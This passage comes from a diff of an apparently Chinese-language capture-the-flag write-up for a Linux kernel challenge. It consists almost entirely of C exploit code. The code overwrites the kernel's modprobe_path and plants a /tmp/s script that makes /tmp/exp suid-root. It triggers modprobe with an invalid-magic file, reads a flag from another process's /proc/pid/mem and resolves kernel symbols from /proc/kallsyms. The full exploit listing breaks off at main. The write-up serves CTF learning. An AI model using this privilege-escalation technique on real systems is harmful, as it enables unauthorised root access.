+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">lseek</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="n">rel_pos</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">hijack_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">hijack_path</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nf">close</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">);</span>
+</span></span></code></pre></div><ul>
+<li>创建恶意脚本<code>/tmp/s</code>，将 exp 设置为 suid-root</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">create_helper</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">script</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span> <span class="o">|</span> <span class="n">O_WRONLY</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>  <span class="c1">// 创建可执行文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">script</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">script</span><span class="p">));</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">chmod</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>  <span class="c1">// 设置执行权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 创建脚本/tmp/s，用于给当前程序设置 SUID 权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">create_helper</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;/tmp/s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;#!/bin/sh</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;chown root:root /tmp/exp</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;chmod 4755 /tmp/exp</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></div><ul>
+<li>执行非法格式文件触发<code>modprobe</code>机制</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 触发 modprobe 执行函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">exec_trigger</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 创建一个包含无效魔数的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">,</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span> <span class="o">|</span> <span class="n">O_WRONLY</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">header</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">};</span>  <span class="c1">// 无效魔数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">chmod</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">);</span>  <span class="c1">// 执行触发文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">exec_trigger</span><span class="p">();</span>
+</span></span></code></pre></div><ul>
+<li>以 root 权限从<code>eatFlag</code>进程内存读取 flag</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 搜索目标进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">search_target_proc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">dp</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="s">&#34;/proc&#34;</span><span class="p">);</span>  <span class="c1">// 打开/proc目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dp</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">ent</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">link_path</span><span class="p">[</span><span class="mi">128</span><span class="p">],</span> <span class="n">real_path</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">ent</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">dp</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">endp</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">proc_id</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endp</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>  <span class="c1">// 转换为进程ID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endp</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>  <span class="c1">// 如果不是数字目录则跳过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
+</span></span><span class="line"><span class="cl">        <span class="c1">// 构建/proc/[pid]/exe符号链接路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">snprintf</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">link_path</span><span class="p">),</span> <span class="s">&#34;/proc/%ld/exe&#34;</span><span class="p">,</span> <span class="n">proc_id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">ssize_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">readlink</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="n">real_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">real_path</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">real_path</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// 确保字符串结束
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// 检查是否是目标进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">real_path</span><span class="p">,</span> <span class="s">&#34;/home/eatFlag&#34;</span><span class="p">))</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">                <span class="nf">closedir</span><span class="p">(</span><span class="n">dp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">proc_id</span><span class="p">;</span>  <span class="c1">// 返回目标进程ID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">closedir</span><span class="p">(</span><span class="n">dp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>  <span class="c1">// 未找到目标进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 读取 flag 函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">proc_id</span> <span class="o">=</span> <span class="nf">search_target_proc</span><span class="p">();</span>  <span class="c1">// 查找目标进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">proc_id</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 打开目标进程的内存文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">mem_file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">mem_file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mem_file</span><span class="p">),</span> <span class="s">&#34;/proc/%d/mem&#34;</span><span class="p">,</span> <span class="n">proc_id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">mem_file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 读取flag指针，固定偏移0x407148
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">secret_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">secret_ptr</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x407148</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 通过指针读取flag数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">secret_data</span><span class="p">[</span><span class="mh">0x110</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">secret_data</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="n">secret_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] FLAG: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">secret_data</span><span class="p">);</span> <span class="c1">//打印 flag
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="exp">exp<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h3>
+<ul>
+<li>完整的 exp：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">proc_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">proc_name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">mem_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">mem_used</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">mem_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">leak_data_t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_kernel_sym</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/tmp/coresysms.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/proc/kallsyms&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">row</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span> <span class="n">sym_name</span><span class="p">[</span><span class="mi">256</span><span class="p">],</span> <span class="n">sym_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">sym_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">row</span><span class="p">),</span> <span class="n">fp</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">sscanf</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="s">&#34;%llx %c %255s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym_type</span><span class="p">,</span> <span class="n">sym_name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">sym_name</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">sym_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">search_target_proc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">dp</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="s">&#34;/proc&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dp</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">ent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">link_path</span><span class="p">[</span><span class="mi">128</span><span class="p">],</span> <span class="n">real_path</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">ent</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">dp</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">endp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">proc_id</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">ent</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endp</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endp</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">link_path</span><span class="p">),</span> <span class="s">&#34;/proc/%ld/exe&#34;</span><span class="p">,</span> <span class="n">proc_id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">ssize_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">readlink</span><span class="p">(</span><span class="n">link_path</span><span class="p">,</span> <span class="n">real_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">real_path</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">real_path</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">real_path</span><span class="p">,</span> <span class="s">&#34;/home/eatFlag&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">closedir</span><span class="p">(</span><span class="n">dp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">proc_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">closedir</span><span class="p">(</span><span class="n">dp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">get_flag</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">proc_id</span> <span class="o">=</span> <span class="nf">search_target_proc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">proc_id</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">mem_file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">mem_file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mem_file</span><span class="p">),</span> <span class="s">&#34;/proc/%d/mem&#34;</span><span class="p">,</span> <span class="n">proc_id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">mem_file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">secret_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">secret_ptr</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0x407148</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">secret_data</span><span class="p">[</span><span class="mh">0x110</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">secret_data</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="p">(</span><span class="kt">off_t</span><span class="p">)</span><span class="n">secret_ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] FLAG: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">secret_data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">create_helper</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">script</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span> <span class="o">|</span> <span class="n">O_WRONLY</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">script</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">script</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">chmod</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">exec_trigger</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">,</span> <span class="n">O_CREAT</span> <span class="o">|</span> <span class="n">O_TRUNC</span> <span class="o">|</span> <span class="n">O_WRONLY</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">header</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">chmod</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/tmp/dummy&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
